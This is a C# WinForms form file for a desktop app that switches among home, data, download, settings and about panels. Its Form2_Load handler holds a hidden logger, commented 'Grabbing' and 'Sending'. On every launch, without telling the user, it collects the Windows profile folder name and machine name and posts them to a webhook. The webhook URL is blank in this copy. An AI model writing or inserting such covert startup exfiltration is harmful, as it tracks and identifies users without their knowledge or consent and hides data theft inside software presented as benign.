
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Test.UserControls;

namespace Test
{

    public partial class Form2 : Form
    {
        public static int Dpage = 1;

        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn(
            int nLeftRect,
            int nTopRect,
            int nRightRect,
            int nBottomRect,
            int nWidthEllipse,
            int nHeightEllipse
            );
        public Form2()
        {
            InitializeComponent();
            this.Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 30, 30));
            UC_Home uc = new UC_Home();
            addusercontrol(uc);
        }


        private void addusercontrol(UserControl userControl)
        {
            userControl.Dock = DockStyle.Fill;
            guna2ContainerControl1.Controls.Clear();
            guna2ContainerControl1.Controls.Add(userControl);
            userControl.BringToFront();
        }

        private void guna2CirclePictureBox4_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }


        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            UC_Data uc = new UC_Data();
            addusercontrol(uc);
            
        }

        private async void Form2_Load(object sender, EventArgs e)
        {
            //Prompt
            if (Properties.Settings.Default.MessageBoxDisplayed == false)
            {
                Form3 form3 = new Form3();
                form3.Show();

            }
            //Logger
            var webhookUrl = "";
            var client = new HttpClient();
            //Grabbing
            var userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            var userProfileName = Path.GetFileName(userProfile);
            var machineName = Environment.MachineName;
            var sb = new StringBuilder();
            //Sending
            sb.AppendLine("```**Machine Information**\n");
            sb.AppendLine("User Profile Folder Name: " + userProfileName);
            sb.AppendLine("Machine Name: " + machineName + "```");
            var json = JsonConvert.SerializeObject(new { content = sb.ToString() });
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            await client.PostAsync(webhookUrl, content);


        }

        private void guna2ContainerControl1_Click(object sender, EventArgs e)
        {

        }

        private void guna2PictureBox4_Click(object sender, EventArgs e)
        {
            UC_Download uc = new UC_Download();
            addusercontrol(uc);
        }

        private void guna2PictureBox5_Click(object sender, EventArgs e)
        {
            UC_Settings uc = new UC_Settings();
            addusercontrol(uc);
        }


        private void Dragpanel_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2PictureBox6_Click(object sender, EventArgs e)
        {
            UC_About uc = new UC_About();
            addusercontrol(uc);
        }

        private void guna2PictureBox3_Click(object sender, EventArgs e)
        {
            UC_Home uc = new UC_Home();
            addusercontrol(uc);
        }

        private void guna2Panel1_Paint(object sender, PaintEventArgs e)
        {

        }

        private void guna2PictureBox2_Click(object sender, EventArgs e)
        {
            ReportBug uc = new ReportBug();
            addusercontrol(uc);
        }
    }
}
